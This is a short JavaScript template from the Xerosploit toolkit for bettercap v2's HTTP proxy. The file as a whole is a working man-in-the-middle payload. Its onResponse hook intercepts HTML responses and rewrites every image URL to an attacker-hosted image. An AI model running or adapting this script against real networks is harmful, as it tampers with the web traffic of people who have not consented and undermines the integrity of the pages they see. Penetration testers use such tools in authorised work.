// Xerosploit replace-images template for bettercap v2 (http.proxy.script).
// __IMAGE_URL__ is replaced by xerosploit.py with the hosted image URL.
// No backreferences: bettercap's JS engine (RE2) does not support them.
function onResponse(req, res) {
  if( res.ContentType.indexOf('text/html') == 0 ){
    var body = res.ReadBody();
    res.Body = body.replace(/(https?:)?[^"'\s<>]+\.(png|jpg|jpeg|bmp|gif|webp|svg)/gi, "__IMAGE_URL__");
  }
}
